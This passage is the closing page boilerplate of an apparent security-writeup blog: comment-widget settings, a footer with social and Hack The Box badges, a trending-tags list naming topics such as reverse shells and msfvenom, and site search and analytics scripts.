'FWkEX16hdTMRmYzFQeIqS4GH-MdYXbMMI', appKey: 'ihjgIDYfMOWOfiX7hkrQrGXR', placeholder:'Your Comments.', avatar: 'wavatar', lang: 'en', enableQQ: true }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <a href="https://twitter.com/0x3n0?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-size="large" data-dnt="true" data-show-count="false">Follow @0x3n0</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></div><script src="https://www.hackthebox.com/badge/381523"></script></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/htb-linux-easy/">htb linux easy</a> <a class="post-tag" href="/tags/htb-windows-easy/">htb windows easy</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/c/">C++</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/programming/">Programming</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
